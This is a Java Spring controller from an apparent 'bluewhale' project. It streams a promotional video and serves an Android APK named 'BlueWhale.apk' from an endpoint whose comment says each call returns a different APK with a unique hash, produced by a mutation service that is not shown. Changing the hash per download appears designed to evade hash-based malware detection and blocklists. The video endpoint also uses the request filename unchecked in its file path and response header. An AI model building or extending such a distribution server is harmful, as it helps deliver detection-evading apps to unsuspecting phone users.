// controller/DownloadController.java
package com.bluewhale.controller;

import com.bluewhale.service.ApkMutationService;
import com.bluewhale.service.VideoService;
import com.bluewhale.storage.FileStorageService;
import org.springframework.core.io.FileSystemResource;
import org.springframework.core.io.Resource;
import org.springframework.http.HttpHeaders;
import org.springframework.http.MediaType;
import org.springframework.http.ResponseEntity;
import org.springframework.web.bind.annotation.*;
import java.nio.file.Path;

@RestController
@RequestMapping("/api")
public class DownloadController {

    private final ApkMutationService apkMutationService;
    private final VideoService videoService;
    private final FileStorageService storage;

    public DownloadController(ApkMutationService apkMutationService, VideoService videoService,
                              FileStorageService storage) {
        this.apkMutationService = apkMutationService;
        this.videoService = videoService;
        this.storage = storage;
    }

    /**
     * Stream video for the frontend (also used as poster)
     * GET /api/videos/blue-whale-demo.mp4
     */
    @GetMapping("/videos/{filename:.+}")
    public ResponseEntity<Resource> streamVideo(@PathVariable String filename) {
        Path path = storage.videoPath(filename);
        if (!path.toFile().exists()) return ResponseEntity.notFound().build();
        videoService.incrementDownload(filename);
        Resource resource = new FileSystemResource(path);
        String contentType = filename.endsWith(".mp4") ? "video/mp4" : "application/octet-stream";
        return ResponseEntity.ok()
                .contentType(MediaType.parseMediaType(contentType))
                .header(HttpHeaders.CONTENT_DISPOSITION, "inline; filename=\"" + filename + "\"")
                .body(resource);
    }

    /**
     * THE critical endpoint — each call returns a DIFFERENT APK (unique hash).
     * GET /api/download/apk
     */
    @GetMapping("/download/apk")
    public ResponseEntity<Resource> downloadApk() {
        try {
            Path apk = apkMutationService.mutate();
            Resource resource = new FileSystemResource(apk);
            return ResponseEntity.ok()
                    .contentType(MediaType.parseMediaType("application/vnd.android.package-archive"))
                    .header(HttpHeaders.CONTENT_DISPOSITION,
                            "attachment; filename=\"BlueWhale.apk\"")
                    .body(resource);
        } catch (Exception e) {
            return ResponseEntity.internalServerError().build();
        }
    }
}